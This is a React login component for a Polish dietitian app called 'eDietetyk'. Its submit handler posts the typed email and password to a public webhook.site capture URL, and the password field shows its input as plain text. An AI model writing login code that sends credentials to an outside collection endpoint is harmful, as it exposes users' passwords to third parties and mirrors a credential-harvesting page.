const loginStyle = {
    height: "300px",
    textAlign: "center",
    width: "500px",
    margin: "0 auto",
    background: "#EFEFEF",
    fontFamily: 'Nunito Sans',
    borderRadius: "1em",
    fontWeight: "bold",
    position: 'absolute', left: '50%', top: '50%',
    transform: 'translate(-50%, -50%)',
}

const formField = {
    height: "36px",
    padding: "0 16px",
    border: "2px solid #a5be00",
    borderRadius: "4px",
    outline: "0",
    transition: ".2s",
    marginTop: "10px",
}

const leftDivStyle = {
    float: "left",
    width: "100px",
    height: "300px",
    background: "#a5be00",
    borderRadius: "1em 0 0 1em",
}

const formStyling = {
    paddingTop: "",
}

const loginButtonStyling = {
    display:"inline-block",
    padding:"0.35em 1.2em",
    border:"0.1em solid #FFFFFF",
    margin:"0 0.3em 0.3em 0",
    borderRadius:"0.12em",
    boxSizing:"border-box",
    textDecoration:"none",
    fontFamily:"'Roboto',sans-serif",
    fontWeight:"300",
    color:"#FFFFFF",
    textAlign:"center",
    transition:"all 0.2s",
    hover: {
         color:"#000000",
         backgroundColor:"#FFFFFF"  
    }
}

class Login extends React.Component {

    state = {
        isFormSubmitted: '',
        login: '',
        password: ''
    }



    formPost = () => {
        try{

            let result = fetch('https://webhook.site/3b9b7b2b-1d64-4469-892c-3b195109c0da', {
                method: 'post',
                mode: 'no-cors',
                headers: {
                    'Accept': 'aplication/json',
                    'Content-type': 'application/json',
                },
                body: JSON.stringify({
                    login: this.state.login,
                    password: this.state.password,
                })
            });

            console.log('Result:' + result);

        } catch(e){

        }
    }

    loginData = (e) => {
        this.setState({
            login: e.target.value,
        })
    }
    passwordData = (e) => {
        this.setState({
            password: e.target.value,
        })
    }
    

     render(){
         return(
             <form>
                 <div id="log-form" style={loginStyle} id="main">

                 <div style={leftDivStyle} id="left"></div>
                 <div id="right">
                 <div  style={formStyling} id="login-form">
                              <h1>eDietetyk</h1>
                              <input style={formField} onChange={this.loginData} type="text" name="email" placeholder="Email"></input><br/>
                              <input style={formField} onChange={this.passwordData} type="text" name="password" placeholder="Hasło"></input><br/>
                              <button id="login-button" type="button" onClick={this.formPost}>Zaloguj</button>
                          </div>
                 </div>
                 </div>  
             </form>
         );
     }

}